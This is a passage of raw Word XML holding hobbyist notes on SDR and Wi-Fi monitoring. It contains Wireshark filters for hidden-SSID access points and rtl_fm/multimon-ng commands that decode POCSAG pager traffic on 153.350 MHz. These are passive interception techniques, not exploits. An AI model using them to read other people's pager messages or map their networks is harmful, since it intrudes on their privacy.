          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>_mgt.ssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00781C97">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>== "Spatula City"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F148DD" w14:textId="22D75821" w:rsidR="003D0165" w:rsidRPr="00781C97" w:rsidRDefault="003D0165" w:rsidP="003D0165">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00781C97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Access Points wi</w:t>
      </w:r>
      <w:r w:rsidR="00781C97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>th ‘cloaked’ or ‘hidden’ SSIDs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A70285" w14:textId="73D5E32E" w:rsidR="003D0165" w:rsidRPr="003D0165" w:rsidRDefault="003D0165" w:rsidP="003D0165">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>==</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>xx:xx:xx:xx:xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.fc.type_subtype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>==0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:color w:val="CC0000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="607878C3" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Pocsag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> decoding</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BDBAB8" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="00540687"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rtl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>_fm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -N -o 4 -A </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>lut</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s 22050 -C -f 153.350M - | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>multimon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -f alpha /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dev</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>stdin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="71B0CB34" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="007669BD" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007669BD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Pocsag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007669BD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> play</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26708A18" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="00540687"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rtl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>_fm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f 153.350M | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -r 24k -f S16_LE -t raw -c 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466E8C77" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="005007BA" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>rtl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>_fm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f 153.353e6 -g 100 -s 22050 -l 310 – | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>multimon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> -t raw -a POCSAG1200 -f alpha /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>dev</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>stdin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="49EF3594" w14:textId="2BC48C75" w:rsidR="003722F8" w:rsidRDefault="003722F8" w:rsidP="003722F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">Once you've found a POCSAG channel, you can then plug your RTL dongle back into the Pi and use the following command to send output to the headphone jack. In the following example I'm tuning to 153.350MHz. This also has the side benefit of turning your </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>RPi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> into an FM radio </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:noProof/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09F9A9AE" wp14:editId="2E37BFC4">
            <wp:extent cx="194945" cy="220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220345"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05AA1532" w14:textId="77777777" w:rsidR="004C6465" w:rsidRDefault="004C6465" w:rsidP="003722F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A7D63A1" w14:textId="77777777" w:rsidR="003722F8" w:rsidRPr="004C6465" w:rsidRDefault="003722F8" w:rsidP="003722F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>rtl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>_fm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f 153.350M | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>aplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> -r 24k -f S16_LE -t raw -c 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1763F0E1"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
    <w:p w14:paraId="701CB5F6"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
    <w:p w14:paraId="187D907C"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roofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> finally to decode them using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>multimon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> and output to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>stdin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>, you can use</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FBDF4D" w14:textId="77777777" w:rsidR="004C6465" w:rsidRDefault="004C6465" w:rsidP="003722F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DFCB5A4" w14:textId="77777777" w:rsidR="004C6465" w:rsidRPr="004C6465" w:rsidRDefault="003722F8" w:rsidP="003722F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>rtl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>_fm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> -N -o 4 -A </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>lut</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s 22050 -C -f 153.350M - | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>multimon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -f alpha /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>dev</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
